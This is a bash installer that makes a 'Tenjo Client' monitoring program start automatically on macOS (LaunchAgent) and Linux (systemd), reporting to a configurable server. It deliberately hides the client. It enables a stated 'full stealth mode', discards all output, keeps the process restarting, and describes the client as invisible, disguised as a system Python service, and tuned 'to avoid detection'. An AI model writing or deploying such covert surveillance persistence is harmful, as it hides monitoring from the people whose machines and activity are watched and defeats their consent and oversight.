#!/bin/bash
# Tenjo Client - Autostart Installation Script
# This script installs Tenjo client to run automatically at system startup

set -e

echo "===================================="
echo "Tenjo Client - Autostart Installer"
echo "===================================="
echo ""

# Detect OS
OS="$(uname -s)"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CLIENT_SCRIPT="$SCRIPT_DIR/main.py"

# Check if main.py exists
if [ ! -f "$CLIENT_SCRIPT" ]; then
    echo "❌ Error: main.py not found in $SCRIPT_DIR"
    exit 1
fi

# Get Python3 path
PYTHON_PATH=$(which python3)
if [ -z "$PYTHON_PATH" ]; then
    echo "❌ Error: python3 not found in PATH"
    exit 1
fi

echo "✓ Python3 found: $PYTHON_PATH"
echo "✓ Client script: $CLIENT_SCRIPT"
echo ""

# macOS Installation
if [ "$OS" = "Darwin" ]; then
    echo "Installing for macOS..."
    
    PLIST_NAME="com.tenjo.client"
    PLIST_PATH="$HOME/Library/LaunchAgents/$PLIST_NAME.plist"
    
    # Determine server URL (default to local, override with env var)
    SERVER_URL="${TENJO_SERVER_URL:-http://127.0.0.1:8000}"
    
    echo "Server URL: $SERVER_URL"
    read -p "Use production server instead? (y/N): " use_production
    if [ "$use_production" = "y" ] || [ "$use_production" = "Y" ]; then
        SERVER_URL="https://tenjo.adilabs.id"
        echo "✓ Using production server: $SERVER_URL"
    fi
    
    # Full stealth mode
    echo "✓ Enabling FULL STEALTH MODE - client will be invisible"
    
    # Create LaunchAgent plist with FULL STEALTH configuration
    cat > "$PLIST_PATH" << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>$PLIST_NAME</string>
    
    <key>ProgramArguments</key>
    <array>
        <string>$PYTHON_PATH</string>
        <string>-c</string>
        <string>import sys; sys.path.insert(0, '$SCRIPT_DIR'); import main</string>
    </array>
    
    <key>EnvironmentVariables</key>
    <dict>
        <key>TENJO_SERVER_URL</key>
        <string>$SERVER_URL</string>
        <key>TENJO_STEALTH_MODE</key>
        <string>true</string>
        <key>TENJO_LOG_LEVEL</key>
        <string>ERROR</string>
        <key>PATH</key>
        <string>/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin</string>
    </dict>
    
    <key>WorkingDirectory</key>
    <string>$SCRIPT_DIR</string>
    
    <key>RunAtLoad</key>
    <true/>
    
    <key>KeepAlive</key>
    <dict>
        <key>SuccessfulExit</key>
        <false/>
        <key>NetworkState</key>
        <true/>
    </dict>
    
    <key>ThrottleInterval</key>
    <integer>60</integer>
    
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
    
    <key>StandardOutPath</key>
    <string>/dev/null</string>
    
    <key>ProcessType</key>
    <string>Background</string>
    
    <key>Nice</key>
    <integer>10</integer>
    
    <key>LowPriorityIO</key>
    <true/>
    
    <key>AbandonProcessGroup</key>
    <true/>
</dict>
</plist>
EOF
    
    # Set proper permissions
    chmod 644 "$PLIST_PATH"
    
    # Load the LaunchAgent
    echo ""
    echo "Loading LaunchAgent..."
    launchctl unload "$PLIST_PATH" 2>/dev/null || true
    launchctl load "$PLIST_PATH"
    
    echo ""
    echo "✅ Installation successful!"
    echo ""
    echo "🕵️  STEALTH MODE ACTIVE:"
    echo "  - Client runs silently in background"
    echo "  - No visible console or windows"
    echo "  - Process appears as system Python service"
    echo "  - Low priority to avoid detection"
    echo "  - Minimal logging (errors only)"
    echo ""
    echo "Client will start automatically at login and after network connection."
    echo ""
    echo "Management commands (admin only):"
    echo "  Start:   launchctl start $PLIST_NAME"
    echo "  Stop:    launchctl stop $PLIST_NAME"
    echo "  Status:  launchctl list | grep tenjo"
    echo "  Check:   ps aux | grep python | grep -v grep"
    echo ""
    echo "To uninstall, run: ./uninstall_autostart.sh"
    
# Linux Installation
elif [ "$OS" = "Linux" ]; then
    echo "Installing for Linux..."
    
    SERVICE_NAME="tenjo-client"
    SERVICE_PATH="/etc/systemd/system/$SERVICE_NAME.service"
    USER_SERVICE_PATH="$HOME/.config/systemd/user/$SERVICE_NAME.service"
    
    # Determine server URL
    SERVER_URL="${TENJO_SERVER_URL:-http://127.0.0.1:8000}"
    
    echo "Server URL: $SERVER_URL"
    read -p "Use production server instead? (y/N): " use_production
    if [ "$use_production" = "y" ] || [ "$use_production" = "Y" ]; then
        SERVER_URL="https://tenjo.adilabs.id"
    fi
    
    # Check if we need sudo
    if [ "$EUID" -eq 0 ]; then
        # Running as root - install as system service
        cat > "$SERVICE_PATH" << EOF
[Unit]
Description=Tenjo Client Monitoring Service
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
User=$SUDO_USER
WorkingDirectory=$SCRIPT_DIR
Environment="TENJO_SERVER_URL=$SERVER_URL"
Environment="TENJO_STEALTH_MODE=true"
Environment="TENJO_LOG_LEVEL=WARNING"
ExecStart=$PYTHON_PATH $CLIENT_SCRIPT
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF
        
        systemctl daemon-reload
        systemctl enable $SERVICE_NAME
        systemctl start $SERVICE_NAME
        
        echo "✅ Installed as system service"
        echo "Status: systemctl status $SERVICE_NAME"
        
    else
        # Running as user - install as user service
        mkdir -p "$(dirname "$USER_SERVICE_PATH")"
        
        cat > "$USER_SERVICE_PATH" << EOF
[Unit]
Description=Tenjo Client Monitoring Service
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
WorkingDirectory=$SCRIPT_DIR
Environment="TENJO_SERVER_URL=$SERVER_URL"
Environment="TENJO_STEALTH_MODE=true"
Environment="TENJO_LOG_LEVEL=WARNING"
ExecStart=$PYTHON_PATH $CLIENT_SCRIPT
Restart=always
RestartSec=60

[Install]
WantedBy=default.target
EOF
        
        systemctl --user daemon-reload
        systemctl --user enable $SERVICE_NAME
        systemctl --user start $SERVICE_NAME
        
        echo "✅ Installed as user service"
        echo "Status: systemctl --user status $SERVICE_NAME"
    fi

# Windows (via WSL or Git Bash)
else
    echo "❌ Unsupported OS: $OS"
    echo ""
    echo "For Windows, please run the PowerShell installation script:"
    echo "  powershell -ExecutionPolicy Bypass -File install_autostart.ps1"
    exit 1
fi

echo ""
echo "🎉 Setup complete!"
